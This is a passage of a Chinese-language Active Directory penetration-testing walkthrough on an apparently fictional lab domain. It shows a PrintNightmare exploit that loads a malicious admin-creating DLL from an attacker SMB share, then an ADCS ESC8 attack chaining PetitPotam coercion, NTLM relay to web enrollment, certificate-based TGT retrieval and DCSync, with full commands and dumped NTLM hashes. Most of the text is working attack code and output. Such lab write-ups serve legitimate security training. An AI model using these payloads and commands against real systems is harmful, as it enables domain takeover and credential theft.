        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            CreateAdminUserInternal();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    // RUNDLL32 entry point
    #ifdef __cplusplus
    extern "C" {
    #endif
    __declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
    {
        CreateAdminUserInternal();
    }
    #ifdef __cplusplus
    }
    #endif
    // Command-line entry point.
    int main()
    {
        return CreateAdminUserInternal();
    }
    x86_64-w64-mingw32-gcc -shared -opnightmare2.dll adduser.c -lnetapi32
    python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@winterfell.north.sevenkingdoms.local '\\192.168.56.1\ATTACKERSHARE\pnightmare2.dll'
    cme smb winterfell.north.sevenkingdoms.local -u pnightmare2 -p 'Test123456789!' --ntds
并通过转储 ntds 享受您的新管理员帐户 :)
    cme smb north.sevenkingdoms.local -u pnightmare2 -p 'Test123456789!' --ntds
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] north.sevenkingdoms.local\pnightmare2:Test123456789! (Pwn3d!)
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] Dumping the NTDS, this could take a while so go grab a redbull...
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d028fe975f3a670c2ed9e0ab63aaff9f:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       arya.stark:1109:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       eddard.stark:1110:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       catelyn.stark:1111:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       robb.stark:1112:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       sansa.stark:1113:aad3b435b51404eeaad3b435b51404ee:835a6b6ea014fe35799fca41782b69c8:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       brandon.stark:1114:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       rickon.stark:1115:aad3b435b51404eeaad3b435b51404ee:1c0c10d5bc5ecd940fd491dcdcd67708:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       hodor:1116:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       jon.snow:1117:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       samwell.tarly:1118:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       jeor.mormont:1119:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       sql_svc:1120:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       pnightmare:1123:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       pnightmare2:1124:aad3b435b51404eeaad3b435b51404ee:c103cafa49983dbcf3d8a1c951f46347:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:d686382f13a5a4eba71875a9cc1c06fe:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       CASTELBLACK$:1121:aad3b435b51404eeaad3b435b51404ee:5e059d6d4202276079d511215299c96f:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:f47985c65a2bfd03e574550cc7db42e0:::
    SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] Dumped 21 NTDS hashes to /root/.cme/logs/WINTERFELL_winterfell.north.sevenkingdoms.local_2023-01-05_110644.ntds of which 18 were added to the database
### 清理
  * 利用之后你会发现你的dll在里面：C:\Windows\System32\spool\drivers\x64\3
  * 以及C:\Windows\System32\spool\drivers\x64\3\Old{id}\ 但我这没有
删不删的 随缘了
# 0x06 ADCS
> 活动目录证书服务(AD CS)是允许我们创建一个PKI的服务器角色，可以提供公钥加密，  
>  数字证书，以及数字签名功能，一些实际应用有S/MIME，安全无无线网络，VPN,IPSEC,  
>  加密文件系统(EFS),智能卡登录，以及SSL/TLS。  
>  应用正确的话，ADCS可以改善一个组织的安全性:  
>  1.通过加密确保机密性  
>  2.通过数字签名确保完整性  
>  3.通过将证书密钥与网络中的计算机，用户，或者设备账号联系以确保认证性。  
>  不正确的ADCS配置可以导致 **特权提升** ，普通域管理甚至可以提升到域管理员以及持久化
在上一篇文章（0x05）中，我们尝试使用域上的用户帐户进行一些攻击。 在这一部分，我们将尝试在域中设置了 ADCS 的情况下进行攻击。 首先，我们将使用
petitpotam unauthenticated 和 ESC8 攻击获取 essos.local 上的域管理员，接下来我们将使用
certipy、bloodhound 和用户帐户枚举模板证书。
最后，我们将利用以下攻击：certipy、esc1、esc2、esc3、esc4、esc6、certifried 和 shadow credentials。
## ESC8 - coerce to domain admin
  * 为了使这种攻击起作用，我们需要：
    * ADCS 在启用了 Web 注册的域上运行。
    * 一种有效的coerce方法（这里我们使用 petitpotam unauthent，但经过身份验证的 printerbug 或其他强制方法将同样有效）
    * 有一个有用的模板可以利用 ESC8，默认情况下在活动目录上，它的名字是 DomainController
  * 让我们检查网络注册是否启动并运行：
  * 服务器要求进行身份验证，所以web enrollement正常运行
  * 添加一个listener以使用 impacket ntlmrelayx 将 SMB 身份验证中继到 HTTP
    python ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
  * 使用petitpotam unauthenticated运行coerce
    python petitpotam.py 192.168.56.1 meereen.essos.local
  * ntlmrelayx 会将身份验证中继到 web 注册并获取证书
  * 将其保存到cert.b64
  * 使用该证书获取一个TGT
    gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'
现在我们获得了 meereen 的 TGT，因此我们可以启动 DCsync 并获取所有 ntds.dit 内容。
    export KRB5CCNAME=meereen.ccache
    python secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
    python impacket/examples/secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    [-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad2f63eb435bfd146bb7c5fb81d8d0c3:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
    viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
    khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
    jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
    sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
    pnightmare:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
    MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:7bff6ffd3120fecf34defeb0a74cd904:::
    BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:a8c2cd634798231afcfe577f4cc09065:::
    SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:ae5b02e43dfe90e148f57f0cd346d9b5:::
    [*] Kerberos keys grabbed
    krbtgt:aes256-cts-hmac-sha1-96:4e45466ee8a4a6ee12393a5417323236a2d0cfcad4f527ee0d1c7f3551de4d4a
## ESC8 - with certipy
  * Oliver Lyak 在 ADCS 攻击工具 certipy 上做得非常出色，可以自动化很多事情。
  * 让我们用 certipy 做同样的攻击，设置listener：
    sudo certipy relay -ca 192.168.56.23 -template DomainController
  * 像我们之前对 petitpotam 所做的那样触发coerce
    python petitpotam.py 192.168.56.1 meereen.essos.local
  * 现在我们获得了证书，因此我们可以使用以下命令获取 DC 的 NT 哈希以及 TGT：
    certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12
  * 同上，我们可以使用 secretsdump 和我们得到的ticket启动 DCsync
    export KRB5CCNAME=meereen.ccache
    python secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
  * 或者使用hash
    python secretsdump.py -hashes ':7bff6ffd3120fecf34defeb0a74cd904' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
## ADCS reconnaissance and enumeration (with certipy and bloodhound)
  * 使用certipy开始枚举
    certipy find -u PI:EMAIL -p 'horse' -dc-ip 192.168.56.12
    这将搜索证书服务器，并以三种格式转储所需的所有信息：
    bloodhound ：准备导入 bloodhound 的 zip（如果您使用 certipy 4.0，则必须安装由 oliver lyak 修改的 bloodhound gui，如果您不想使用修改后的版本，则必须使用 -old-bloodhound 选项）
    json : json格式的信息
    txt ：文本格式
  * Certipy 4.0 还重新引入了 -vulnerable 选项来显示易受攻击的模板。
    certipy find -u PI:EMAIL -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
  * details
        certipy find -u PI:EMAIL -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
      Certipy v4.3.0 - by Oliver Lyak (ly4k)
      [*] Finding certificate templates
      [*] Found 38 certificate templates
      [*] Finding certificate authorities
      [*] Found 1 certificate authority
      [*] Found 16 enabled certificate templates
      [*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
      [*] Got CA configuration for 'ESSOS-CA'
      [*] Enumeration output:
      Certificate Authorities
        0
          CA Name                             : ESSOS-CA
          DNS Name                            : braavos.essos.local
          Certificate Subject                 : CN=ESSOS-CA, DC=essos, DC=local
          Certificate Serial Number           : 67A9523D1C61848042059A12A1AE837D
          Certificate Validity Start          : 2022-11-29 16:18:34+00:00
          Certificate Validity End            : 2027-11-29 16:28:33+00:00
          Web Enrollment                      : Enabled